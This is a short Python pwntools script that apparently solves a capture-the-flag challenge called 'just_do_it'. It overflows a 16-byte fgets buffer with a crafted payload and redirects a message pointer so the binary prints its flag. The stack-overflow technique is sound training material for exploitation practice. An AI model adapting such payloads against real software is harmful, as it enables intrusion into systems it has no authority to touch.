#!/usr/bin/python3
from pwn import *
# Connect to target process
target = process('./just_do_it')
for i in range(2):
    print(target.recvline().decode('utf-8'))
# The binary reads in 32 characters into a 16 character buffer:
# pcVar1 = fgets(buf,0x20,stdin);
payload = b'a'*20+b'\x80\xa0\x04\x08'+b'\n'
#   we can override the 16 character buffer, next variable on the stack, and change the
# address of failure_message to point to the flag which is at address 0804a080
target.send(payload)
print(payload)
log.info('Flag is '+target.recvline().decode('utf-8'))

